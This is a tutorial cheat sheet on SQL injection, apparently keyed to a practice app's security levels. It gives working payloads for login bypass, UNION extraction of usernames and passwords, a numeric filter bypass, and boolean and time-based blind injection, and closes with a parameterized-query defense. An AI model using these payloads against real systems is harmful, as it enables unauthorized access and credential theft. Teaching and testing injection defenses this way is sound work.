# SQL: Injection

## SQL Injection (SQLi) Payloads

**SQL Injection (SQLi)** is a vulnerability where an attacker manipulates a web application's database queries by inserting malicious SQL code into user input (e.g., login fields, URL parameters).

### **Vulnerability Level: LOW (Unsanitized Input)**

The application takes input and directly concatenates it into the query. The attack is simple: use a single quote (`'`) to break the original query structure.

**Original Vulnerable Query (Backend):**

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id';
```

### **1. Authentication Bypass**

The goal is to trick the `WHERE` clause into always evaluating as **TRUE**, thus logging the attacker in or returning all records.

| Attack Goal | Input Payload for `$id` | Resulting Backend Query |
| --- | --- | --- |
| **Bypass Login** | `1' OR '1'='1` | `SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';` |
| **Comment Out** | `1' OR 1=1 --` | `SELECT first_name, last_name FROM users WHERE user_id = '1' OR 1=1 --';` |
| **Error (Initial Test)** | `5'` | `SELECT first_name, last_name FROM users WHERE user_id = '5'';` **(Syntax Error)** |

### **2. Union-Based Data Extraction**

The goal is to use the **`UNION SELECT`** operator to append the results of a new query (targeting sensitive data) to the original result set.

| Attack Goal | Payloads to Inject | Purpose / Resulting Action |
| --- | --- | --- |
| **Find Column Count** | `1' ORDER BY 3 --+1' ORDER BY 4 --+` | Increments until an error occurs. If `4` errors, the query has **3 columns**. |
| **Make Original Query Empty** | `-1' UNION SELECT 1,2,3 --+` | A non-existent ID (`-1`) ensures the first `SELECT` returns nothing, making the injected `SELECT` visible. |
| **Extract Database Info** | `-1' UNION SELECT 1, database(), version() --+` | **Payload:** Injects functions to retrieve the current database name and version. |
| **Extract User Credentials** | `-1' UNION SELECT user, password, 3 FROM users --+` | **Payload:** Injects a query to fetch the `user` and `password` columns from the `users` table. |

---

### **Vulnerability Level: MEDIUM (Partial Filtering)**

The application uses functions like `addslashes()` on strings, escaping the single quote (`'`) to `\'`. This defeats simple string-based injections. However, if the `user_id` field is treated as a **numeric integer** in the backend query, the vulnerability persists.

**Example Bypass (if `user_id` is an unquoted integer):**
| Attack Goal | Input Payload for `$id` | Resulting Backend Query (Vulnerable) |
| :--- | :--- | :--- |
| **Bypass Filter** | `1 OR 1=1` | `SELECT first_name, last_name FROM users WHERE user_id = 1 OR 1=1;` |

---

### **Blind SQL Injection Payloads**

Used when the application does not return data or error messages. The attacker relies on **TRUE/FALSE** conditions to enumerate the database structure character by character.

### **1. Blind Boolean-Based SQLi**

The application response changes subtly (e.g., text appears/disappears) based on the query's TRUE/FALSE result.

| Attack Goal | Test Payload (Condition) | Resulting Action |
| --- | --- | --- |
| **Test DB Length** | `1' AND (LENGTH(database())) = 8 --+` | If TRUE, page content is normal. If FALSE, page content changes. |
| **Test First Letter** | `1' AND SUBSTRING(database(), 1, 1) = 'a' --+` | Attacker iterates through letters ('a', 'b', 'c', etc.) until the condition is TRUE. |

### **2. Blind Time-Based SQLi**

The attacker uses time functions to force a delay based on a TRUE/FALSE result.

| Attack Goal | Test Payload (Condition) | Resulting Action |
| --- | --- | --- |
| **Conditional Delay** | `1' AND IF(LENGTH(database()) = 8, SLEEP(5), 0) --+` | **If TRUE:** The server waits for 5 seconds before responding. **If FALSE:** The server responds immediately. |
| **Extract First Letter** | `1' AND IF(SUBSTRING(database(), 1, 1) = 'd', SLEEP(5), 0) --+` | The attacker uses a binary search or iteration to identify the character based on the time delay. |

---

### **Defense: High Security (Parameterized Queries)**

This is the only effective defense against SQLi. Input is sent to the database separately from the SQL command. The database engine treats the user input as a literal value, not as executable code.

**Secure Backend Code (Using a Parameter/Placeholder):**

```sql
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
```

**Attacker Input:** `1' OR 1=1 --`**Database Execution:** The database literally searches for a user ID that is a **string** `'1' OR 1=1 --`, which will not return sensitive data. The injected code is treated as data, not a command.
